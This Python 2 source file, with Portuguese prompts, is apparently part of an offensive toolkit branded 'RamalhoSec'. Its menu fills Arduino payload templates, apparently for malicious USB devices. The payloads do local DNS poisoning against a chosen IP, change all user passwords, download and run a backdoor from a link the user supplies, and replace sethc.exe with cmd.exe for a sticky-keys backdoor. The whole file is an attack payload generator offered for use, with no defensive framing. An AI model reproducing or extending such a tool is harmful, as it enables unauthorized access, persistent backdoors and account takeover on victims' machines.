from mainmenu import *
def subcommandmenu():
    from mainmenu import mainmenu
    print ("""
        1 - Payload local dns poisoning
        2 - Password allusrpass changer
        3 - Download and Execute backdoor
        4 - Change sethc.exe by cmd.exe
        0 - Back to frist select menu
        """)

    submenuselect = raw_input(str("Selecione uma opção: "))

    if submenuselect == "1":
        print ("local dns poisoning ok")
        targetip = raw_input(str("Digite o ip alvo : "))
        print (targetip)
        targetlink = raw_input(str("Digite o link desejado : "))
        print (targetlink)

        f = open('payloads/Localdns-poising.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("IPDLVR", targetip).replace("LINKDLVR", targetlink)
        f = open('out/OUT-Localdns-poising.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-Localdns-poising.ino")


    elif submenuselect == "2":
        print("user pass changer ok");
        newpass = raw_input(str("Digite a senha desejada : "))
        print (newpass)

        f = open('payloads/Passlusrchanger.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("NEWPASS", newpass)
        f = open('out/OUT-Passlusrchanger.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-Passlusrchanger.ino")


    elif submenuselect == "3":
        print("Download and Execute ok");
        newpass = raw_input(str("Digite o link do backdoor : "))
        backdoor = raw_input(str("Digite o nome do arquivo : "))
        print (newpass)

        f = open('payloads/Downandexecute.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("HOST", newpass).replace("PAYLOAD", backdoor)
        f = open('out/OUT-Downandexecute.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-Downandexecute.ino")


    elif submenuselect == "4":
        data = "RamalhoSec"
        f = open('payloads/Comandlocaluseredit.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("CREDS", data)
        f = open('out/OUT-Comandlocaluseredit.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-Comandlocaluseredit.ino")


    elif submenuselect == "0":
        os.system('cls')
        logo1()
        mainmenu()
    else:
        os.system('cls')
        logo1()
        print ("Selecione uma opção valida!!")
        subcommandmenu();
